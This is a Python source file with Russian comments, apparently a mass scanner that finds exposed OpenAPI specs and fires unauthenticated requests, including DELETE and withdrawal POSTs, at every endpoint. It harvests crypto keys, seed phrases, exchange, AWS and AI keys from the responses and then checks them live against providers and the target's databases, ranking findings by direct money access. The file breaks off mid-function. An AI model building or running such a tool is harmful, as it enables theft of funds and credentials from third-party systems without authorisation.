# -*- coding: utf-8 -*-
"""Проверка хоста: OpenAPI discovery + auth check."""
import asyncio
import base64
import json
import re
import ssl
import time
from typing import Any
from concurrent.futures import ThreadPoolExecutor

import aiohttp

from .ai_verify import (
    check_dsn,
    extract_ai_keys,
    extract_aws_keypairs,
    extract_dsns,
    extract_exchange_pairs,
    extract_secrets,
    extract_telegram_bots,
    extract_twilio_pairs,
    extract_twitter_bearers,
    verify_ai_key,
    verify_aws_keypair,
    verify_exchange_keypair,
    verify_secret,
    verify_telegram_bot,
    verify_twilio_pair,
    verify_twitter_bearer,
)
from .config import Settings
from .models import HostRow, CheckResult


# Пути для поиска OpenAPI
# Money rule: пути вывода средств (только POST — GET-история не считается)
WITHDRAW_PATH_RE = re.compile(r'(?:withdraw|withdrawal|payout|cash_?out)', re.I)

# Пассивная классификация withdraw-эндпоинта по уже записанному ответу
# (без повторных опасных запросов)
WITHDRAW_AUTH_RE = re.compile(
    r'(authentication required|missing session|unauthorized|permission denied'
    r'|认证失败|인증|please login|token required)',
    re.I,
)
WITHDRAW_VALIDATION_RE = re.compile(
    r'(is required|are required|must be provided|validation|expecting value|invalid request)',
    re.I,
)
WITHDRAW_NOISE_RE = re.compile(
    r'(<!doctype|<html|application is running|website is not available'
    r'|ошибка 404|not found)',
    re.I,
)
WITHDRAW_CLASS_SEVERITY = {
    "": "CRITICAL",
    "withdraw_open": "CRITICAL",       # дошли до бизнес-валидации без auth
    "withdraw_processed": "CRITICAL", # запрос обработан успешно
    "withdraw_protected": "HIGH",     # auth реально требуется
    "withdraw_noise": "MEDIUM",       # HTML-заглушка/мусор вместо API
}


def classify_withdraw_response(body: str) -> str:
    """Классификация withdraw-эндпоинта по уже полученному ответу.

    Пассивно - повторные POST на вывод опасны, используем записанный ответ.
    """
    b = body[:5000]
    if WITHDRAW_AUTH_RE.search(b):
        return "withdraw_protected"
    if WITHDRAW_NOISE_RE.search(b):
        return "withdraw_noise"
    if WITHDRAW_VALIDATION_RE.search(b):
        return "withdraw_open"
    if re.search(r'"success"\s*:\s*true|"status"\s*:\s*"?(ok|success)', b, re.I) \
            or b.strip().lower() in ("success", "ok"):
        return "withdraw_processed"
    return ""

OPENAPI_PATHS = [
    "/openapi.json",
    "/swagger.json",
    "/api/openapi.json",
    "/v1/openapi.json",
    "/v2/openapi.json",
    "/v3/openapi.json",
    "/api-docs",
    "/v3/api-docs",
    "/v2/api-docs",
    "/swagger/v1/swagger.json",
    "/docs/openapi.json",
    "/rest/openapi.json",
    "/service/openapi.json",
]

# Паттерны чувствительных данных (из prototype/auth_checker/crypto_detect.py)
SENSITIVE_PATTERNS = {
    # CRITICAL - прямые деньги
    "password": re.compile(r'"(?:password|passwd|email_password|user_password)"\s*:\s*"([^"]{3,})"', re.I),
    "private_key_pem": re.compile(r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----'),
    "evm_private_key": re.compile(r'"(?:private_key|privateKey|privKey|priv_key)"\s*:\s*"(?:0x)?[0-9a-fA-F]{64}"'),
    "bitcoin_wif": re.compile(r'"(?:private_key|wif|priv)"\s*:\s*"[5KL][1-9A-HJ-NP-Za-km-z]{50,51}"'),
    "extended_key": re.compile(r'\b(xprv|yprv|zprv|tprv)[1-9A-HJ-NP-Za-km-z]{50,}\b'),
    "solana_key": re.compile(r'"(?:private_key|secret_key|solana_key)"\s*:\s*"[1-9A-HJ-NP-Za-km-z]{87,88}"'),
    # seed_phrase: 12+ слов через пробел (BIP-39)
    "seed_phrase": re.compile(r'"(?:seed|seed_phrase|seedphrase|mnemonic|backup_phrase|recovery_phrase)"\s*:\s*"([a-z]+(?:\s+[a-z]+){11,})"', re.I),
    # secret_key: hex формат 32+ символов
    "secret_key": re.compile(r'"(?:secret_key|master_key|secretKey)"\s*:\s*"[0-9a-fA-F]{32,}"'),
    # otp_secret: base32 формат (A-Z, 2-7)
    "otp_secret": re.compile(r'"(?:otp_secret|totp_secret)"\s*:\s*"[A-Z2-7]{16,}"'),
    "stripe_live": re.compile(r'sk_live_[0-9a-zA-Z]{24,}'),
    "stripe_restricted": re.compile(r'rk_live_[0-9a-zA-Z]{24,}'),
    # Money rule: разрешение вывода средств в конфиге/ответе
    "withdraw_flag": re.compile(r'"(?:can_withdraw|withdraw_enabled|withdrawal_enabled|allow_withdraw)"\s*:\s*"?(?:true|1)"?'),

    # HIGH - доступ к системам
    "facebook_access_token": re.compile(r'"(?:access_token|page_access_token)"\s*:\s*"(EAA[A-Za-z0-9]{50,})"'),
    "github_token": re.compile(r'gh[ps]_[A-Za-z0-9]{36,}'),
    "gitlab_token": re.compile(r'glpat-[A-Za-z0-9\-]{20,}'),
    "telegram_bot": re.compile(r'\d{8,10}:[A-Za-z0-9_-]{35}'),
    "slack_token": re.compile(r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}'),
    "discord_token": re.compile(r'\b[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{25,}\b'),
    "discord_webhook": re.compile(r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+'),
    "sendgrid_key": re.compile(r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'),
    "twilio_key": re.compile(r'SK[0-9a-fA-F]{32}'),
    "exchange_secret": re.compile(r'"(?:api_secret|apiSecret)"\s*:\s*"[A-Za-z0-9]{64}"'),
    # HIGH - auth tokens
    "refresh_token": re.compile(r'"refresh_token"\s*:\s*"[^"]{16,}"', re.I),
    "auth_token": re.compile(r'"auth_token"\s*:\s*"[^"]{16,}"', re.I),
    "bearer_token": re.compile(r'"bearer"\s*:\s*"[^"]{16,}"', re.I),
    "jwt_token": re.compile(r'"jwt"\s*:\s*"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"'),
    # HIGH - AWS
    "aws_access_key": re.compile(r'AKIA[0-9A-Z]{16}'),
    "aws_secret_key": re.compile(r'"(?:aws_secret|secret_access_key|aws_secret_access_key)"\s*:\s*"[A-Za-z0-9/+=]{40}"'),
    # HIGH - Exchange
    "binance_key": re.compile(r'"(?:api_key|apiKey)"\s*:\s*"[A-Za-z0-9]{64}"'),
    # AI/SaaS API-ключи: уникальные префиксы провайдеров + generic api_key поля.
    # Generic часть требует цифру в значении (отсеиваем placeholder'ы вида "your_api_key")
    # и исключает ровно 64 alnum (их ловит binance_key) - дублей нет.
    "ai_apikey": re.compile(
        r'(?:\b(?:sk-|sk-(?:proj|svcacct)-|sk-ant-|sk-or-v1-|gsk_|pplx-|hf_|xai-|r8_|fw_)[A-Za-z0-9_-]{20,}'
        r'|"(?:api_key|apiKey|api_token|consumer_key|client_secret)"\s*:\s*"'
        r'(?![A-Za-z0-9]{64}")'  # ровно 64 alnum ловит binance_key
        r'(?![0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")'  # UUID - это id, не ключ
        r'(?![ps]k_(?:live|test)_)'  # Stripe ключи ловит stripe_live
        r'(?=[A-Za-z0-9_-]*\d)[A-Za-z0-9_-]{20,}")',
        re.I),
    # Деньги: связка api_key+api_secret одной биржи - полный доступ к выводу.
    # Между полями могут быть другие поля (client_id и т.п.), но не вложенные объекты
    "exchange_keypair": re.compile(
        r'"(?:api_key|apiKey)"\s*:\s*"[^"]{16,}"[^{}]{0,200}?"(?:api_secret|apiSecret|secret_key|secretKey)"\s*:\s*"[^"]{8,}"'),
    # Вход в админку/аккаунт: креды прямо в Authorization
    "basic_auth": re.compile(r'"authorization"\s*:\s*"Basic\s+[A-Za-z0-9+/]{16,}={0,2}"', re.I),
    "reset_token": re.compile(r'"(?:reset_password_token|reset_token|password_reset_token)"\s*:\s*"[^"]{8,}"', re.I),
    # Обход 2FA: backup/recovery коды
    "two_fa_backup": re.compile(r'"(?:two_factor_backup|backup_codes|recovery_codes)"\s*:\s*(?:"[A-Za-z0-9_-]{6,}"|\[\s*")', re.I),
    # Ответ подтверждает что учётка - админская
    "admin_flag": re.compile(r'"(?:is_admin|super_admin|is_superuser)"\s*:\s*(?:true|1)\b', re.I),
    # Крипта: Ethereum UTC keystore (расшифровывается паролем)
    "keystore_json": re.compile(r'"cipher"\s*:\s*"?aes-', re.I),
    # HIGH - SMTP/DB credentials
    "smtp_password": re.compile(r'"(?:smtp_pass|smtp_password)"\s*:\s*"[^"]{4,}"', re.I),
    "credential": re.compile(r'"(?:credential|credentials)"\s*:\s*"[^"]{8,}"', re.I),
    # HIGH - generic access_token (not Facebook-specific)
    "access_token": re.compile(r'"access_token"\s*:\s*"[^"]{20,}"', re.I),
    # HIGH - API keys with strict patterns
    "google_api_key": re.compile(r'AIza[0-9A-Za-z_-]{35}'),
    "openai_key": re.compile(r'sk-[A-Za-z0-9]{48,}'),
    "mailgun_key": re.compile(r'key-[0-9a-f]{32}'),
    "npm_token": re.compile(r'npm_[A-Za-z0-9]{36}'),
    "pypi_token": re.compile(r'pypi-[A-Za-z0-9_-]{80,}'),
    "shopify_key": re.compile(r'shpat_[a-fA-F0-9]{32}'),
    "dropbox_token": re.compile(r'sl\.[A-Za-z0-9_-]{130,}'),

    # MEDIUM - DSN с credentials (требуют user:pass@)
    "postgres_dsn": re.compile(r'postgres(?:ql)?://[^\s"]+:[^\s"]+@[^\s"]+'),
    "mysql_dsn": re.compile(r'mysql://[^\s"]+:[^\s"]+@[^\s"]+'),
    "mongodb_dsn": re.compile(r'mongodb(?:\+srv)?://[^\s"]+:[^\s"]+@[^\s"]+'),
    "redis_dsn": re.compile(r'redis://[^\s"]+:[^\s"]+@[^\s"]+'),
    "amqp_dsn": re.compile(r'amqp://[^\s"]+:[^\s"]+@[^\s"]+'),
    "smtp_dsn": re.compile(r'smtp://[^\s"]+:[^\s"]+@[^\s"]+'),

    # MEDIUM - session tokens
    "session_id": re.compile(r'"session_id"\s*:\s*"[^"]{8,}"', re.I),
    "session_token": re.compile(r'"session_token"\s*:\s*"[^"]{8,}"', re.I),

    # TEST - проверить и удалить ненужные
    "admin_password": re.compile(r'"admin_password"\s*:\s*"[^"]{3,}"', re.I),
    "wp_auth_key": re.compile(r'"(?:auth_key|secure_auth_key|logged_in_key|nonce_key)"\s*:\s*"[^"]{16,}"', re.I),
    "wp_salt": re.compile(r'"(?:auth_salt|secure_auth_salt|logged_in_salt|nonce_salt)"\s*:\s*"[^"]{16,}"', re.I),
    "db_password": re.compile(r'"(?:db_password|DB_PASSWORD)"\s*:\s*"[^"]{3,}"'),

    # Crypto wallets and keys
    "wallet_address": re.compile(r'"(?:wallet_address|wallet|address)"\s*:\s*"(?:0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|[1-9A-HJ-NP-Za-km-z]{32,44})"'),
    "private_key_generic": re.compile(r'"(?:private_key|privateKey|privKey|priv_key)"\s*:\s*"[^"]{20,}"', re.I),
}

# Маскированные значения (игнорируем)
MASKED_VALUES = {"*", "**", "***", "****", "*****", "******", "********"}

# Placeholder хосты в DSN (примеры из документации)
PLACEHOLDER_HOSTS = {
    "host", "hostname", "localhost", "127.0.0.1",
    "example.com", "example.org", "your-host", "your-server",
    "db-host", "database-host", "server", "dbserver",
}

# AWS example keys (из документации)
AWS_EXAMPLE_KEYS = {
    "AKIAIOSFODNN7EXAMPLE",
    "AKIAI44QH8DHBEXAMPLE",
    "AKIAEXAMPLEKEY",
}

# Placeholder значения (когда значение = название поля)
PLACEHOLDER_VALUES = {
    "password", "passwd", "secret", "token", "key", "api_key", "apikey",
    "email", "username", "user", "login", "string", "your_password",
    "your_token", "your_key", "your_secret", "enter_password", "test",
    "example", "sample", "demo", "placeholder", "changeme", "change_me",
}


def is_placeholder_value(field: str, value: str) -> bool:
    """Проверяет что значение - placeholder (совпадает с именем поля или типичный пример)."""
    val_lower = value.lower().strip()
    field_lower = field.lower().replace("_", "").replace("-", "")
    # Значение совпадает с полем: "password": "Password"
    if val_lower == field_lower or val_lower.replace("_", "") == field_lower:
        return True
    # Типичные placeholder значения
    if val_lower in PLACEHOLDER_VALUES:
        return True
    return False


def is_aws_example_key(key: str) -> bool:
    """Проверяет что AWS ключ - пример из документации или мусор (блобы/заполнители)."""
    if key in AWS_EXAMPLE_KEYS or "EXAMPLE" in key.upper():
        return True
    # Низкая энтропия: AKIAAAAUAAAAAAAAAAAA (base64-блобы, заполнители)
    return len(set(key[4:])) < 4


def is_placeholder_dsn(dsn: str) -> bool:
    """Проверяет что DSN - placeholder/пример/шаблон/маска."""
    lower = dsn.lower()
    # user:pass@host - явный пример
    if "user:pass@" in lower or "username:password@" in lower:
        return True
    # Шаблонные значения конфигураций {{config...}}
    if "{{" in dsn or "}}" in dsn:
        return True
    # Замаскированный пароль (**** / ...)
    if "://" in dsn:
        creds = dsn.split("://", 1)[1].split("@", 1)[0]
        if ":" in creds:
            pw = creds.rsplit(":", 1)[1]
            if pw and set(pw) <= {"*", ".", "-"}:
                return True
    # Проверяем хост после @
    if "@" in lower:
        host_part = lower.split("@")[1].split("/")[0].split(":")[0]
        if host_part in PLACEHOLDER_HOSTS:
            # localhost с реальными кредами - не placeholder:
            # это креды БД самой цели, проверим на её публичном IP
            if host_part in ("localhost", "127.0.0.1") and "://" in dsn:
                creds = dsn.split("://", 1)[1].split("@", 1)[0]
                user, _, pw = creds.partition(":")
                if user and pw and pw.lower() not in PLACEHOLDER_VALUES and not is_masked_value(pw):
                    return False
            return True
    return False


def is_masked_value(value: str) -> bool:
    """Проверяет что значение маскировано."""
    return value in MASKED_VALUES or set(value) <= {"*", ".", "-"}


# Хеш пароля (не plaintext - требует взлома, не деньги сразу):
# {bcrypt}$..., bcrypt$..., $2a$10$... (raw bcrypt), $argon2id$..., $pbkdf2..., $scrypt...
HASHED_PASSWORD_RE = re.compile(
    r'^(?:\{?(?:bcrypt|argon2|pbkdf2|scrypt)\}?[$:0-9]'
    r'|\$2[abxy]?\$\d+\$'
    r'|\$9\$'
    r'|\$6\$'
    r'|\$argon2[id]{0,2}\$'
    r'|\$pbkdf2'
    r'|\$scrypt)',
    re.I,
)
# hex-хеши md5/sha1/sha256 в поле password
HEX_HASH_RE = re.compile(r'^[0-9a-fA-F]{32}$|^[0-9a-fA-F]{40}$|^[0-9a-fA-F]{64}$')
# закодированный блоб (base64 >= 100 символов) вместо пароля
ENCODED_BLOB_RE = re.compile(r'^[A-Za-z0-9+/=_-]{100,}$')
# Дата вида 2026-10-17
DATE_VALUE_RE = re.compile(r'^\d{4}-\d{2}-\d{2}$')


def is_junk_token_value(val: str) -> bool:
    """Мусорные значения токенов/session id: fake_/mock_/demo_, даты, без цифр."""
    v = val.strip()
    if DATE_VALUE_RE.match(v):
        return True
    if re.match(r'(?i)^(fake|mock|test|demo|guest)[_-]', v):
        return True
    if not any(c.isdigit() for c in v):
        return True
    return False


# Severity по паттернам (из prototype/auth_checker/crypto_detect.py)
SEVERITY_MAP = {
    # CRITICAL - прямые деньги
    "password": "CRITICAL",
    "private_key_pem": "CRITICAL",
    "evm_private_key": "CRITICAL",
    "bitcoin_wif": "CRITICAL",
    "extended_key": "CRITICAL",
    "solana_key": "CRITICAL",
    "seed_phrase": "CRITICAL",
    "secret_key": "CRITICAL",
    "otp_secret": "CRITICAL",
    "stripe_live": "CRITICAL",
    "stripe_restricted": "CRITICAL",
    "withdraw_flag": "CRITICAL",
    "withdraw_endpoint": "CRITICAL",
    "withdraw_open": "CRITICAL",
    "withdraw_processed": "CRITICAL",
    "withdraw_protected": "HIGH",
    "withdraw_noise": "MEDIUM",
    # HIGH - доступ к системам
    "facebook_access_token": "HIGH",
    "github_token": "HIGH",
    "gitlab_token": "HIGH",
    "telegram_bot": "HIGH",
    "telegram_bot_valid": "HIGH",
    "telegram_bot_money": "CRITICAL",
    "aws_key_valid": "HIGH",
    "stripe_key_valid": "CRITICAL",
    "slack_token_valid": "HIGH",
    "discord_token_valid": "HIGH",
    "github_token_valid": "HIGH",
    "gitlab_token_valid": "HIGH",
    "mailgun_key_valid": "HIGH",
    "sendgrid_key_valid": "HIGH",
    "npm_token_valid": "MEDIUM",
    "dropbox_token_valid": "HIGH",
    "twilio_pair_valid": "HIGH",
    "twitter_token_valid": "MEDIUM",
    "exchange_key_valid": "CRITICAL",
    "exchange_withdraw_enabled": "CRITICAL",
    "money_target": "CRITICAL",
    "dsn_reachable": "MEDIUM",
    "dsn_auth_ok": "CRITICAL",
    "slack_token": "HIGH",
    "discord_token": "HIGH",
    "discord_webhook": "MEDIUM",
    "sendgrid_key": "HIGH",
    "twilio_key": "HIGH",
    "exchange_secret": "HIGH",
    "refresh_token": "HIGH",
    "auth_token": "HIGH",
    "bearer_token": "HIGH",
    "jwt_token": "HIGH",
    "aws_access_key": "HIGH",
    "aws_secret_key": "HIGH",
    "binance_key": "HIGH",
    "ai_apikey": "HIGH",
    "ai_key_valid": "HIGH",
    "exchange_keypair": "CRITICAL",
    "basic_auth": "HIGH",
    "reset_token": "HIGH",
    "two_fa_backup": "CRITICAL",
    "admin_flag": "HIGH",
    "keystore_json": "CRITICAL",
    "smtp_password": "HIGH",
    "database_url": "HIGH",
    "credential": "HIGH",
    "access_token": "HIGH",
    "google_api_key": "HIGH",
    "openai_key": "HIGH",
    "mailgun_key": "HIGH",
    "npm_token": "HIGH",
    "pypi_token": "HIGH",
    "shopify_key": "HIGH",
    "dropbox_token": "HIGH",
    # MEDIUM - DSN
    "postgres_dsn": "MEDIUM",
    "mysql_dsn": "MEDIUM",
    "mongodb_dsn": "MEDIUM",
    "redis_dsn": "MEDIUM",
    "amqp_dsn": "MEDIUM",
    "smtp_dsn": "MEDIUM",
    # MEDIUM - sessions
    "session_id": "MEDIUM",
    "session_token": "MEDIUM",
    # TEST patterns
    "admin_password": "CRITICAL",
    "wp_auth_key": "HIGH",
    "wp_salt": "HIGH",
    "db_password": "CRITICAL",
    # Адрес кошелька сам по себе денег не даёт (нужен ключ) - понижаем
    "wallet_address": "MEDIUM",
    "private_key_generic": "CRITICAL",
}


def is_openapi_spec(text: str) -> bool:
    """Проверяет что текст похож на OpenAPI спецификацию."""
    t = text[:2000].lower()
    if text.strip().startswith("{"):
        return any(kw in t for kw in ['"openapi"', '"swagger"', '"paths"', '"info"'])
    if "openapi:" in t or "swagger:" in t:
        return True
    return False


def classify_response(body: str) -> tuple[list[str], str]:
    """Классифицирует ответ по паттернам (логика из prototype/auth_checker)."""
    patterns_found: list[str] = []
    max_severity = "LOW"
    severity_order = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}

    for name, pattern in SENSITIVE_PATTERNS.items():
        matched = False
        # Перебираем все вхождения: первое может оказаться placeholder'ом,
        # а реальное значение - дальше по телу
        for m in pattern.finditer(body):
            value_text = m.group(0)

            # Для password проверяем что значение не маскировано и не placeholder
            if name in ("password", "admin_password", "db_password", "smtp_password", "reset_token"):
                val_match = re.search(r'"(\w+)"\s*:\s*"([^"]*)"', value_text)
                if val_match:
                    field, val = val_match.group(1), val_match.group(2)
                    if is_masked_value(val) or is_placeholder_value(field, val):
                        continue  # placeholder - проверяем следующие вхождения
                    if HASHED_PASSWORD_RE.match(val):
                        continue  # хеш пароля (вкл. сырой $2a$/$argon2), не plaintext
                    if HEX_HASH_RE.match(val):
                        continue  # md5/sha1/sha256 хеш
                    if ENCODED_BLOB_RE.match(val):
                        continue  # закодированный блоб (base64), не пароль

            # Токены: отсеиваем мусорные значения (fake_, даты, без цифр)
            if name in ("refresh_token", "auth_token", "bearer_token", "access_token", "session_id", "session_token"):
                tok_match = re.search(r':\s*"([^"]*)"', value_text)
                if tok_match and is_junk_token_value(tok_match.group(1)):
                    continue

            # credential: пропускаем не-секретные значения (дипломы, описания)
            if name == "credential":
                cred_match = re.search(r':\s*"([^"]*)"', value_text)
                if cred_match and not any(c.isdigit() for c in cred_match.group(1)):
                    continue

            # basic_auth: пропускаем примеры user:pass из документации
            if name == "basic_auth":
                b64_match = re.search(r'Basic\s+([A-Za-z0-9+/=]+)', value_text, re.I)
                if b64_match:
                    try:
                        user, _, pwd = base64.b64decode(b64_match.group(1)).decode("utf-8", "replace").partition(":")
                    except (ValueError, UnicodeDecodeError):
                        user, pwd = "", ""
                    if user.lower() in PLACEHOLDER_VALUES or pwd.lower() in PLACEHOLDER_VALUES or is_masked_value(pwd):
                        continue

            # Для AWS ключей: не пример, не мусор, не presigned URL
            if name == "aws_access_key":
                if is_aws_example_key(value_text):
                    continue
                # presigned S3 URL: ключ врЕменный, зашит в самой ссылке -
                # это не утечка кредов
                before = body[max(0, m.start() - 30):m.start()]
                if "X-Amz-Credential=" in before or "AWSAccessKeyId=" in before:
                    continue

            # Для DSN проверяем что не placeholder
            if name.endswith("_dsn") and is_placeholder_dsn(value_text):
                continue

            matched = True
            break

        if not matched:
            continue

        patterns_found.append(name)
        sev = SEVERITY_MAP.get(name, "LOW")
        if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
            max_severity = sev

    return patterns_found, max_severity


async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> CheckResult:
    """
    Проверяет хост: ищет OpenAPI, тестирует эндпоинты.

    Эта функция ничего не знает про БД — только сеть.
    """
    base_url = row.base_url  # protocol://host:port

    started = time.perf_counter()
    deadline = time.monotonic() + cfg.host_timeout
    result = CheckResult(is_alive=False)

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    timeout = aiohttp.ClientTimeout(total=cfg.check_timeout)
    connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=10)

    try:
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
        ) as session:
            # 1. TCP alive check
            result.is_alive = True
            result.latency_ms = int((time.perf_counter() - started) * 1000)

            # 2. Поиск OpenAPI спецификации
            spec = None
            spec_path = None

            for path in OPENAPI_PATHS:
                if time.monotonic() >= deadline:
                    break
                try:
                    url = base_url.rstrip("/") + path
                    async with session.get(url, allow_redirects=False, proxy=proxy) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            if is_openapi_spec(text):
                                spec = json.loads(text)
                                spec_path = path
                                break
                except (json.JSONDecodeError, aiohttp.ClientError):
                    continue

            if spec is None:
                result.has_openapi = False
                return result

            # 3. Парсим спецификацию
            result.has_openapi = True
            result.spec_path = spec_path
            result.spec_title = spec.get("info", {}).get("title", "Unknown")

            paths = spec.get("paths", {})
            security_schemes = spec.get("components", {}).get("securitySchemes", {})
            global_security = spec.get("security", [])
            has_global_security = bool(global_security) or bool(security_schemes)

            endpoints_data: list[dict[str, Any]] = []
            all_patterns: list[str] = []
            max_severity = "LOW"
            severity_order = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}
            # AI-ключи, найденные в ответах (key -> provider), для верификации
            ai_keys_found: dict[str, str] = {}
            telegram_bots_found: set[str] = set()
            aws_keypairs_found: set[tuple[str, str]] = set()
            dsns_found: set[str] = set()
            secrets_found: set[tuple[str, str]] = set()
            twilio_pairs_found: set[tuple[str, str]] = set()
            twitter_bearers_found: set[str] = set()
            exchange_pairs_found: list[dict[str, Any]] = []
            exchange_pairs_seen: set[tuple[str, str, str]] = set()

            # 4. Тестируем эндпоинты
            for path_template, methods in paths.items():
                if not isinstance(methods, dict):
                    continue

                for method, details in methods.items():
                    if time.monotonic() >= deadline:
                        break
                    if method.upper() not in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                        continue

                    # Проверяем security на уровне операции
                    op_security = details.get("security", None)
                    expects_auth = has_global_security if op_security is None else bool(op_security)

                    # Money rule: POST на путь с withdraw/payout/cashout -
                    # потенциальный вывод средств (GET-истории не считаем)
                    withdraw_op = (
                        method.upper() == "POST"
                        and bool(WITHDRAW_PATH_RE.search(path_template))
                    )

                    # Подставляем параметры пути
                    test_path = re.sub(r'\{[^}]+\}', '1', path_template)
                    url = base_url.rstrip("/") + test_path

                    ep_data: dict[str, Any] = {
                        "path": path_template,
                        "method": method.upper(),
                        "expects_auth": expects_auth,
                        "status_code": None,
                        "verdict": None,
                        "patterns": [],
                        "response": None,
                    }

                    try:
                        async with session.request(
                            method.upper(),
                            url,
                            allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
                            proxy=proxy,
                        ) as resp:
                            ep_data["status_code"] = resp.status
                            body = await resp.text()

                            if resp.status == 200:
                                # Классифицируем ответ
                                patterns, sev = classify_response(body[:100_000])
                                if withdraw_op:
                                    # Пассивная классификация по ответу:
                                    # open/processed = деньги доступны, protected =
                                    # нужен auth, noise = заглушка
                                    wclass = classify_withdraw_response(body)
                                    patterns = patterns + ["withdraw_endpoint"]
                                    if wclass:
                                        patterns.append(wclass)
                                    wsev = WITHDRAW_CLASS_SEVERITY.get(wclass, "CRITICAL")
                                    if severity_order.get(wsev, 0) > severity_order.get(sev, 0):
                                        sev = wsev
                                ep_data["patterns"] = patterns
                                all_patterns.extend(patterns)

                                # Собираем AI-ключи, ботов, AWS-ключи и DSN для проверки
                                if cfg.ai_key_checks:
                                    for prov, k in extract_ai_keys(body[:100_000]):
                                        ai_keys_found.setdefault(k, prov)
                                if cfg.telegram_bot_checks:
                                    telegram_bots_found.update(extract_telegram_bots(body[:100_000]))
                                if cfg.aws_key_checks:
                                    for access_key, secret in extract_aws_keypairs(body[:100_000]):
                                        if (
                                            not is_aws_example_key(access_key)
                                            and not secret.endswith('EXAMPLEKEY')
                                        ):
                                            aws_keypairs_found.add((access_key, secret))
                                if cfg.dsn_checks:
                                    dsns_found.update(
                                        d for d in extract_dsns(body[:100_000])
                                        if not is_placeholder_dsn(d)
                                    )
                                if cfg.secret_checks:
                                    secrets_found.update(extract_secrets(body[:100_000]))
                                if cfg.twilio_checks:
                                    twilio_pairs_found.update(extract_twilio_pairs(body[:100_000]))
                                if cfg.twitter_checks:
                                    twitter_bearers_found.update(
                                        extract_twitter_bearers(body[:100_000]))
                                if cfg.exchange_checks:
                                    for p in extract_exchange_pairs(body[:100_000]):
                                        sig = (p["exchange"], p["key"], p["secret"])
                                        if sig not in exchange_pairs_seen:
                                            exchange_pairs_seen.add(sig)
                                            exchange_pairs_found.append(p)

                                if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                                    max_severity = sev

                                # Логика verdict:
                                # WITHDRAW_RISK - POST withdraw-эндпоинт доступен без auth
                                # VULNERABLE - есть паттерны (реальные данные)
                                # EXPOSED - expects_auth но доступен без auth (потенциальная проблема)
                                # PUBLIC_OK - публичный эндпоинт
                                if patterns:
                                    ep_data["verdict"] = "WITHDRAW_RISK" if withdraw_op else "VULNERABLE"
                                    result.vulnerable_count += 1
                                elif expects_auth:
                                    ep_data["verdict"] = "EXPOSED"
                                    result.public_count += 1  # считаем как exposed, не vulnerable
                                else:
                                    ep_data["verdict"] = "PUBLIC_OK"
                                    result.public_count += 1

                                # Сохраняем JSON ответ (до 50KB) только для важных
                                if patterns:
                                    try:
                                        ep_data["response"] = json.loads(body[:50_000])
                                    except json.JSONDecodeError:
                                        ep_data["response"] = body[:50_000]

                            elif resp.status in (401, 403):
                                ep_data["verdict"] = "PROTECTED"
                                result.protected_count += 1
                            else:
                                ep_data["verdict"] = "ERROR"

                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        ep_data["verdict"] = "ERROR"

                    endpoints_data.append(ep_data)
                    result.total_endpoints += 1

            # Проверка AI-ключей: валидность/баланс у провайдеров
            # (только бесплатные эндпоинты - списания нет)
            ai_key_checks: list[dict[str, Any]] = []
            if cfg.ai_key_checks and ai_keys_found:
                for k, prov in list(ai_keys_found.items())[: cfg.ai_key_max]:
                    chk = await verify_ai_key(
                        session, prov, k,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    ai_key_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("ai_key_valid")
                        if severity_order.get(max_severity, 0) < 2:
                            max_severity = "HIGH"

            # Проверка telegram-ботов: жив ли бот (getMe, через прокси);
            # у живых ищем платёжные команды - бот-касса = канал денег
            telegram_checks: list[dict[str, Any]] = []
            if cfg.telegram_bot_checks and telegram_bots_found:
                for token in list(telegram_bots_found)[: cfg.telegram_bot_max]:
                    chk = await verify_telegram_bot(
                        session, token,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    telegram_checks.append(chk)
                    if chk["status"] == "valid":
                        if chk.get("money"):
                            # Живой бот с платёжными командами (вывод/баланс)
                            all_patterns.append("telegram_bot_money")
                            if severity_order.get(max_severity, 0) < 3:
                                max_severity = "CRITICAL"
                        else:
                            all_patterns.append("telegram_bot_valid")
                            if severity_order.get(max_severity, 0) < 2:
                                max_severity = "HIGH"

            # Проверка AWS-пар: STS GetCallerIdentity (SigV4, через прокси)
            aws_key_checks: list[dict[str, Any]] = []
            if cfg.aws_key_checks and aws_keypairs_found:
                for access_key, secret in list(aws_keypairs_found)[: cfg.aws_key_max]:
                    chk = await verify_aws_keypair(
                        session, access_key, secret,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    aws_key_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("aws_key_valid")
                        if severity_order.get(max_severity, 0) < 2:
                            max_severity = "HIGH"

            # Проверка DSN: доступен ли хост, работают ли креды (postgres).
            # Внутренние хосты (localhost/docker) проверяем на публичном IP цели.
            dsn_checks: list[dict[str, Any]] = []
            if cfg.dsn_checks and dsns_found:
                for d in list(dsns_found)[: cfg.dsn_max]:
                    chk = await check_dsn(
                        d, timeout_s=max(cfg.check_timeout, 5),
                        target_host=row.host,
                    )
                    dsn_checks.append(chk)
                    if chk["status"] == "auth_ok":
                        # Креды работают - полный доступ к БД
